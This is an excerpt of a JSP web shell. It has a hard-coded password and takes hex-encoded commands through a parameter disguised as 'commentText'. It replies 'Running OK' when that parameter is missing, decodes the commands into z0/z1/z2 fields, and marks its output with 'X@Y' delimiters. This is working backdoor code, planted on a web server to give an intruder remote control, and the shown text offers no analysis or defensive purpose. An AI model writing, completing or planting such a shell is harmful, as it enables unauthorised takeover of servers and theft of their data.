...
<%!
String Pwd="FUiimckppolyicyogoU";
...
os.write(("X@Y").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("X@Y").getBytes(),0,3);os.close();is.close();}
...
%><%
String d = request.getParameter("commentText");
if(d==null){
	out.println("Running OK");
	out.close();
	return;
}
int len = d.length();
...
for (int i = 0; i < len; i += 2) {
    bytes[i / 2] = (byte) ((Character.digit(d.charAt(i), 16) << 4) + Character.digit(d.charAt(i+1), 16));
    }
d = new String(bytes);
String[] parts = d.split("&");
Map<String, String> req = new HashMap<String, String>();
for(String part : parts){
	String[] params = part.split("=",2);
	req.put(params[0], java.net.URLDecoder.decode(params[1], "UTF-8"));
	//out.println(String.format("%s = %s", params[0], java.net.URLDecoder.decode(params[1], "UTF-8")));
}
String cs=req.get("z0")+"";request.setCharacterEncoding(cs);response.setContentType("text/html;charset="+cs);
String Z=EC(req.get(Pwd)+"",cs);String z1=EC(req.get("z1")+"",cs);String z2=EC(req.get("z2")+"",cs);
